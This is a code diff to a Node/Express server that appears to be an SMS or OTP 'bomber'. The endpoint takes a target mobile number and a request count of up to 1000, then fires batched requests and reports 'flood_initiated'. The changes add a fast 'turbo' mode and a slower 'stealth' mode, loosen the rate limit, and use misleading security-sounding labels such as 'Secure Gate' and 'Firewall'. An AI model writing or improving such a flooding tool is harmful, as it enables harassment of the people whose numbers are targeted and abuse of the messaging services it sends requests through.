@@ -41,19 +41,20 @@ async function startServer() {
     }
 
     const requestCount = Math.min(Math.max(parseInt(count) || 1, 1), 1000); 
+    const isTurbo = req.body.mode === "turbo";
     
     // Rate limiting: 3 seconds cooldown
     const now = Date.now();
     const lastRequestTime = rateLimitMap.get(ip) || 0;
-    if (now - lastRequestTime < 3000) {
+    if (now - lastRequestTime < 2000) { // Reduced to 2s for better UX
       return res.status(429).json({ 
-        error: "Firewall Active: Cluster stabilization in progress. Wait 3s."
+        error: "Firewall Active: Cluster stabilization in progress. Wait 2s."
       });
     }
     rateLimitMap.set(ip, now);
 
     try {
-      console.log(`[V4.2 Secure Gate] Auth: TLS-SYNC | Source: ${anonymizedIp} | Target: ${mobileNum} | Intensity: ${requestCount}`);
+      console.log(`[V4.2 Secure Gate] Auth: TLS-SYNC | Source: ${anonymizedIp} | Target: ${mobileNum} | Intensity: ${requestCount} | Mode: ${isTurbo ? 'TURBO' : 'STEALTH'}`);
 
       // Construct params once for efficiency
       const params = new URLSearchParams();
@@ -83,33 +84,29 @@ async function startServer() {
         }
       };
 
-      // IMPLEMENTING BATCHING SYSTEM (10 requests every 100ms)
-      const batchSize = 10;
-      const delayBetweenBatches = 100;
+      // IMPLEMENTING RESILIENT BATCHING SYSTEM
+      const batchSize = isTurbo ? 25 : 5;
+      const delayBetweenBatches = isTurbo ? 10 : 300; 
 
-      const runBatch = async (startIdx: number) => {
-        const batchPromises = [];
-        const endIdx = Math.min(startIdx + batchSize, requestCount);
-        
-        for (let i = startIdx; i < endIdx; i++) {
-          batchPromises.push(fireRequest());
+      (async () => {
+        let sentCount = 0;
+        while (sentCount < requestCount) {
+          const currentBatchSize = Math.min(batchSize, requestCount - sentCount);
+          const batchPromises = Array.from({ length: currentBatchSize }).map(() => fireRequest());
+          await Promise.all(batchPromises);
+          sentCount += currentBatchSize;
+          if (sentCount < requestCount) {
+            await new Promise(resolve => setTimeout(resolve, delayBetweenBatches));
+          }
         }
-        
-        await Promise.all(batchPromises);
-
-        if (endIdx < requestCount) {
-          setTimeout(() => runBatch(endIdx), delayBetweenBatches);
-        }
-      };
-
-      // Start the recursive batch process
-      runBatch(0);
+        console.log(`[V4.2] All ${requestCount} requests dispatched for ${mobileNum}`);
+      })().catch(err => console.error("Batch Failure:", err));
 
       res.json({
         status: "flood_initiated",
         count: requestCount,
         target: mobile,
-        pattern: "batched_delay_100ms",
+        mode: isTurbo ? "TURBO" : "STEALTH",
         gateway: "Shatarudra Hyper-Proxy V4",
         timestamp: new Date().toISOString()
       });
@@ -118,6 +115,11 @@ async function startServer() {
       console.error("Gateway Sync Error:", err);
       res.status(500).json({ error: "Cloud Infrastructure Sync Failed" });
     }
+  });
+
+  // API 404 Fallback
+  app.use("/api/*", (req, res) => {
+    res.status(404).json({ error: "API Endpoint Not Found" });
   });
 
   // Vite middleware for development
